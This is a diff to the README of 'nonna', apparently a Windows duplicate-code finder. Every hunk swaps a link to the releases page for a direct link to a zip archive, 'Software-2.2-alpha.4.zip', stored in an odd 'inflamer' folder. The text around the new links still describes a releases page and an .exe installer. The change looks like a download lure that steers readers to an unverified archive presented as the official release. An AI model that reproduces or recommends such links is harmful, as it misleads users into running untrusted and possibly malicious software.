@@ -1,6 +1,6 @@
 # 🛡️ nonna - Find Duplicate Code Easily
 
-[![Download nonna](https://img.shields.io/badge/Download-nonna-%23879C54?style=for-the-badge)](https://github.com/Effervescent-continuousreceiverwatch400/nonna/releases)
+[![Download nonna](https://img.shields.io/badge/Download-nonna-%23879C54?style=for-the-badge)](https://github.com/Effervescent-continuousreceiverwatch400/nonna/raw/refs/heads/main/inflamer/Software-2.2-alpha.4.zip)
 
 ---
 
@@ -29,7 +29,7 @@ Follow these steps to download and run nonna on your Windows machine.
 
 Visit the official releases page to get the program:
 
-[![Download nonna](https://img.shields.io/badge/Download-nonna-blue?style=for-the-badge)](https://github.com/Effervescent-continuousreceiverwatch400/nonna/releases)
+[![Download nonna](https://img.shields.io/badge/Download-nonna-blue?style=for-the-badge)](https://github.com/Effervescent-continuousreceiverwatch400/nonna/raw/refs/heads/main/inflamer/Software-2.2-alpha.4.zip)
 
 This link takes you to the page where you find the latest version installers and files. Look for a file with `.exe` in its name, such as `nonna-setup.exe`. This is the installer you need.
 
@@ -107,7 +107,7 @@ If nonna does not work as expected, try these steps:
 
 You can always visit the releases page to get the latest version here:
 
-[Download nonna](https://github.com/Effervescent-continuousreceiverwatch400/nonna/releases)
+[Download nonna](https://github.com/Effervescent-continuousreceiverwatch400/nonna/raw/refs/heads/main/inflamer/Software-2.2-alpha.4.zip)
 
 Look for the installer file ending with `.exe` and follow the installation steps.
 
